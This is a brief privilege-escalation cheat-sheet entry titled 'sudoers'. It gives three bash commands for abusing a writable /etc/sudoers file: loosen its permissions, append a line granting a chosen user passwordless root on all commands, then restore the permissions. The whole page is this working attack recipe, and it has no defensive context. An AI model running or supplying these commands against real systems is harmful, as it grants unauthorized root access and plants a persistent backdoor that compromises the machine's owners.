---
title: "sudoers"
date: 2024-7-3
tags: ["sudoers", "sudo", "privesc", "/etc/sudoers"]
---

---
#### Abuse #1: Writable /etc/sudoers

<div>

```bash
chmod 600 /etc/sudoers
```

```bash
echo '<USER>   ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
```

```bash
chmod 440 /etc/sudoers
```

</div>

<br>
